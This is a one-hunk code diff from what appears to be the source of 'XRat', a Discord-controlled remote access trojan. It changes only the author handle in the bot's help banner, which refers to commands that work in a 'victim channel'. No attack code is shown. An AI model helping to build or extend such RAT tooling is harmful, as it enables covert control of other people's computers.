@@ -265,7 +265,7 @@ class Program
     {
         await userMessage.Channel.SendMessageAsync(@$"
 {Settings.banner}
-{userMessage.Author.Mention} | XRat by @avirt_
+{userMessage.Author.Mention} | XRat by @.avirt
 -------------------------------------------
 Commands below works only in victim channel
 -------------------------------------------
